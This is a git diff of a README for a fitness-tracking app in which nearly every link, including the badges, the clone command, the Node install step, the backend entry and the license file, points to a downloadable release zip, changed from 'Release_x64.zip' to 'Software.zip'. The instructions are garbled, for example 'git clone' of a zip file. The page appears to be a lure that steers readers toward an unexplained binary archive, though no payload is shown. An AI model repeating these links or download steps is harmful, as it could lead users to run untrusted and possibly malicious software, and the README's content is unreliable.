@@ -1,10 +1,10 @@
 # 🏋️ Fit Track Progress Goals 🚀
 
-Welcome to the Fit Track Progress Goals repository! Let's track our fitness goals, share progress, and achieve great results together! Created at [https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip).
+Welcome to the Fit Track Progress Goals repository! Let's track our fitness goals, share progress, and achieve great results together! Created at [https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip).
 
-[![License: MIT](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip)](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip)
-[![GitHub code size in bytes](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip)](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip)
-[![GitHub release (latest by date)](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip)](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip)
+[![License: MIT](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip)](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip)
+[![GitHub code size in bytes](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip)](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip)
+[![GitHub release (latest by date)](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip)](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -26,8 +26,8 @@ Are you ready to take control of your fitness journey and reach your goals? Fit 
 
 ## Installation
 To get started with Fit Track Progress Goals, follow these steps:
-1. Clone the repository to your local machine using `git clone https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip`
-2. Install https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip and npm if you haven't already.
+1. Clone the repository to your local machine using `git clone https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip`
+2. Install https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip and npm if you haven't already.
 3. Navigate to the project directory and run `npm install` to install the dependencies.
 
 ## Usage
@@ -36,7 +36,7 @@ To get started with Fit Track Progress Goals, follow these steps:
 3. Sign up for an account, set your fitness goals, and start tracking your progress.
 
 ## Technologies Used
-- Backend: https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip
+- Backend: https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip
 - Frontend: React
 - Database: MongoDB
 - Other Technologies: JavaScript, Machine Learning, DevOps
@@ -50,8 +50,8 @@ We welcome contributions from the open-source community to make Fit Track Progre
 5. Create a new Pull Request
 
 ## License
-This project is licensed under the MIT License - see the [https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip) file for details.
+This project is licensed under the MIT License - see the [https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip) file for details.
 
-For the latest software release, download [https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v1.0/Release_x64.zip).
+For the latest software release, download [https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip](https://github.com/rockyyy12/fit-track-progress-goals/releases/download/v2.0/Software.zip).
 
 Get ready to elevate your fitness journey with Fit Track Progress Goals! 💪🏃‍♂️ Let's achieve our goals together! 🌟
